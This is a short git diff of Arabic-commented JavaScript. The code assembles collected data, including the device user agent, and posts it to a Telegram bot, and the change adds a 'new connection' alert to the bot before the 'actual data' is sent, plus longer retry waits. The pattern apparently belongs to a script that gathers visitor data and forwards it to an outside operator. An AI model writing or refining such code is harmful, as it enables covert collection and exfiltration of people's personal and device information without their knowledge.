@@ -378,14 +378,35 @@ ${data.device.userAgent}`;
             const payload = {
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML',
                 disable_web_page_preview: false
             };
             
             log('📡 رسالة جاهزة للإرسال');
             log(`📡 URL: ${url}`);
             
-            // 3 محاولات مع انتظار أقل
+            // إرسال رسالة اختبار أولاً
+            try {
+                const testResponse = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: '🔔 اتصال جديد...'
+                    })
+                });
+                
+                if (testResponse.ok) {
+                    log('✅ الاتصال بالبوت ناجح');
+                } else {
+                    log('❌ فشل الاتصال بالبوت');
+                }
+            } catch (e) {
+                log('❌ خطأ في الاتصال: ' + e.message);
+            }
+            
+            // إرسال البيانات الفعلية
             for (let attempt = 1; attempt <= 3; attempt++) {
                 try {
                     log(`📤 محاولة ${attempt}/3`);
@@ -444,7 +465,8 @@ ${data.device.userAgent}`;
                 
                 // انتظار بين المحاولات
                 if (attempt < 3) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    log('⏳ انتظار قبل المحاولة التالية...');
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                 }
             }
             
